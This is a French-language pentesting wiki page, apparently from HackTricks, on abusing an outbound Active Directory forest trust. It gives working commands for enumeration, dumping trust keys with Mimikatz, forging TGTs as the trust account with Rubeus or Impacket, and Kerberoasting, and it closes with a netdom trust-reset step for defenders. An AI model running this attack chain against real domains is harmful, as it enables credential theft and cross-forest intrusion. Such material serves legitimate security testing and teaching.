# Domaine de forêt externe - unidirectionnelle (sortante)

{{#include ../../banners/hacktricks-training.md}}

Dans ce scénario, **votre domaine** accorde certains **privilèges** à des principaux provenant d’un **domaine/forêt différent**.

## Énumération

### Relation de confiance sortante
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Si vous disposez du module AD, inspectez également directement le **Trusted Domain Object (TDO)**. Cela vous fournit les données brutes du trust stockées dans LDAP dont vous aurez besoin plus tard pour déterminer si la voie la plus simple est l’abus de **FSP/group** ou l’abus du **trust account** :
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
You should also enumerate where the foreign principals from `CN=ForeignSecurityPrincipals` were actually granted access. Common wins are:

- **Local admin** on a server/DC in your current domain
- Membership in a **custom domain group** that has ACLs over users/computers/GPOs
- Rights to modify **computer objects**, which can later become [RBCD](resource-based-constrained-delegation.md) if the trust configuration allows it

## Trust Account Attack

When a one-way trust is created from domain/forest **B** to domain/forest **A** (**B trusts A**), a **trust account** for **B** is created in **A**. In the outbound-trust view of **A**, this is useful because if you later compromise **B** (the trusting side), you can dump the trust secret there and authenticate back to **A** as `B$`.<sup>[[1]](#references)</sup>

The critical aspect to understand here is that the password and Kerberos material for that trust account can be extracted from a Domain Controller in the **trusting** domain using:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Cela fonctionne parce que le compte de confiance créé dans le domaine **trusted** est un principal activé qui finit par disposer des droits de base d’un utilisateur de domaine normal dans ce domaine. Cela suffit souvent pour commencer à énumérer LDAP, demander des tickets et trouver le prochain chemin d’escalade.<sup>[[1]](#references)</sup>

Dans un scénario où `ext.local` est le domaine **trusting** et `root.local` le domaine **trusted**, un compte utilisateur nommé `EXT$` est créé dans `root.local`. Le Dumping des clés de confiance depuis `ext.local` révèle des identifiants qui peuvent être utilisés en tant que `root.local\EXT$` contre `root.local` :<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Ensuite, utilisez la clé **RC4** extraite pour vous authentifier en tant que `root.local\EXT$` dans `root.local` :<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Ensuite, énumérez le domaine approuvé en tant que ce principal, par exemple en effectuant un Kerberoasting d’un SPN à forte valeur dans `root.local` :<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Depuis Linux

Si vous avez récupéré la **clé du compte de confiance RC4**, la même idée fonctionne depuis Linux avec Impacket :
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Si **RC4** n’est pas accepté, utilisez en dernier recours le **mot de passe en clair** récupéré (ou les clés **AES** dérivées), puis réutilisez les workflows habituels [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) et [Kerberoast](kerberoast.md) depuis cette foothold.

### Pièges liés au matériel de clés

Ne confondez pas les **trust keys** et les **trust-account credentials** :<sup>[[1]](#references)</sup>

- Dans une relation d’approbation unidirectionnelle, les deux côtés stockent un **TDO**, mais le compte utilisateur **`EXT$`** réel existe uniquement dans le domaine approuvé.
- Le mot de passe actuel du trust account est reflété dans le trust secret du TDO (`NewPassword` / current trust key).
- La clé **RC4** du trust est l’artefact le plus facile à réutiliser avec `asktgt` en tant que trust account ; dans les configurations par défaut, il s’agit généralement de l’enctype fonctionnel, car l’attribut `msDS-SupportedEncryptionTypes` du trust account est souvent vide.
- Si vous raisonnez en termes de **AES trust keys**, rappelez-vous qu’elles ne sont pas interchangeables avec les clés AES du trust account, car les salts diffèrent.

Ainsi, pour la technique présentée sur cette page, privilégiez soit le matériel **RC4** extrait, soit le mot de passe en **clair** récupéré.<sup>[[1]](#references)</sup>

### Récupération du mot de passe du trust en clair

Dans le flow précédent, le hash du trust a été utilisé à la place du **mot de passe en clair** (qui est également **dumped par mimikatz**).<sup>[[1]](#references)</sup>

Le mot de passe en clair peut être obtenu en convertissant la sortie \[ CLEAR ] de mimikatz depuis l’hexadécimal et en supprimant les octets nuls `\x00` :<sup>[[1]](#references)</sup>

![Trust Account Attack - Récupération du mot de passe du trust en clair : Le mot de passe en clair peut être obtenu en convertissant la sortie ( CLEAR ) de mimikatz depuis l’hexadécimal et en supprimant les octets nuls...](<../../images/image (938).png>)

Lors de la création d’une relation d’approbation, il est parfois nécessaire qu’un utilisateur saisisse un mot de passe pour le trust. Dans cette démonstration, la clé correspond au mot de passe d’origine du trust et est donc lisible par un humain. Lorsque la clé est renouvelée (par défaut : tous les 30 jours), le texte en clair cesse généralement d’être lisible, mais reste techniquement utilisable.<sup>[[1]](#references)</sup>

Le mot de passe en clair peut être utilisé pour effectuer une authentification standard en tant que trust account, au lieu de demander un TGT avec la clé secrète Kerberos du trust account. Ici, une requête est effectuée vers `root.local` depuis `ext.local` pour rechercher les membres de `Domain Admins` :<sup>[[1]](#references)</sup>

![Trust Account Attack - Récupération du mot de passe du trust en clair : Le mot de passe en clair peut être utilisé pour effectuer une authentification standard en tant que trust account, au lieu de demander un TGT...](<../../images/image (792).png>)

### Limitations pratiques

> [!WARNING]
> Les trust accounts sont des principals peu pratiques. Les logons interactifs tels que **RUNAS / console / RDP** ne constituent pas le chemin attendu ici, et les tentatives d’authentification **NTLM** peuvent échouer avec `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Prévoyez plutôt des logons réseau **Kerberos** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>

### Note sur la persistance / le nettoyage

Si les defenders comprennent que le domaine faisant confiance a été compromis, ils doivent renouveler le trust secret **des deux côtés** avec `netdom trust ... /resetOneSide ...`. Du point de vue de l’opérateur, cela est important, car un **reset manuel invalide immédiatement l’ancien matériel du trust**, tandis que le renouvellement normal du mot de passe du trust conserve les valeurs actuelle et précédente pendant le rollover.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Références

- [1] [SID filter as security boundary between domains? (Part 7) – Trust account attack – from trusting to trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Resetting a trust password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
